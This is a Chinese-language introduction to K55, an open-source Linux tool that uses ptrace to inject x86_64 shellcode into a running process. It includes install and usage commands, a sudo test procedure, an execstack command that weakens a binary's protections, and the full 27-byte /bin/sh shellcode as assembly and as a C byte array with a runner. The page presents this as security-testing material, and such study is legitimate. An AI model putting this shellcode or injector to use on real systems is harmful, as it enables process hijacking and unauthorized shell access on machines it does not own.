![](https://image.3001.net/images/20210125/1611547632_600e43f082cfbd13c2dbc.png!small)

## 关于K55

K55是一款 Payload注入工具，该工具可以向正在运行的进程注入x86_64 shellcode
Payload。该工具使用现代C++11技术开发，并且继承了某些传统的C
Linux函数，比如说ptrace()等等。在目标进程中生成的shellcode长度为27个字节，并且能够在目标进程的地址空间中执行/bin/sh（生成一个Bash
shell）。将来，我们还会支持允许用户通过命令行参数输入自己的shellcode。

## 工具安装

广大研究人员可以使用下列命令将该项目源码克隆至本地，然后完成工具的安装、构建与配置：

    
    
    git clone https://github.com/josh0xA/K55.git
    
    cd K55
    
    chmod +x build-install.sh
    
    ./build-install.sh

## K55使用

    
    
    Usage: ./K55 <process-name>

上述命令中的process-name进程名可以是任何带有r-xp或execstack权限的Linux进程。

### 测试

 **测试1 - 打开一个命令行窗口，切换至K55/目录下，然后运行下列命令：**

    
    
    ./k55_example_process/k55_test_process

 **测试2 - 打开另一个命令行窗口，通过下列命令运行注入器：**

    
    
    sudo ./K55 k55_test_process

## K55使用样例

当K55的shellcode注入器以root权限运行之后，将会在k55_test_process中生成一个shell。

### 向给定进程注入Payload：

![](https://image.3001.net/images/20210125/1611547668_600e44140455043bc9bfc.png!small)

### 在目标进程中生成Shell：

![](https://image.3001.net/images/20210125/1611547676_600e441c7c9abb970bbdd.png!small)

### 注入成功并生成Shell：

![](https://image.3001.net/images/20210125/1611547687_600e442772b6bcb263756.png!small)

## 工具限制

很明显，针对ptrace的调用肯定不够隐蔽。因此，还是会有一些应用可以限制K55的功能。不过，对于安全测试来说，我们还需要确保目标应用程序启用了execstack。比如说，如果我在gdb上进行测试，那么在注入之前，我需要运行下列命令：

    
    
    sudo execstack -s /usr/bin/gdb

如果你是用的是Arch Linux，你可以直接在AUR中找到execstack。

## 制作Shell Payload

注意：在下面给出的例子中，Payload字符串已经硬编码进了K55之中。

### Payload汇编代码实现

    
    
    main:
    
        xor eax, eax
    
        mov rbx, 0xFF978CD091969DD1
    
        neg rbx
    
        push rbx
    
        push rsp
    
        pop rdi
    
        cdq
    
        push rdx
    
        push rdi
    
        push rsp
    
        pop rsi
    
        mov al, 0x3b
    
    Syscall

### Payload的C语言实现

    
    
    #include <stdio.h>
    
    #include <string.h>
    
     
    
    // Shellcode breakdown of the assembly code.
    
    char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
    
     
    
    int main()
    
    {
    
        printf("len:%d bytes\n", strlen(code));
    
        (*(void(*)()) code)();
    
        return 0;
    
    }

## 许可证协议

本项目的开发与发布遵循MIT开源许可证协议。

## 项目地址

K55：【[ _GitHub传送门_](https://github.com/josh0xA/K55)】

## 参考资料

> [ _http://shell-storm.org/shellcode/files/shellcode-806.php_](http://shell-> storm.org/shellcode/files/shellcode-806.php)
>
> [ _https://0x00sec.org/t/linux-infecting-running-> processes/1097﻿_](https://0x00sec.org/t/linux-infecting-running-> processes/1097)

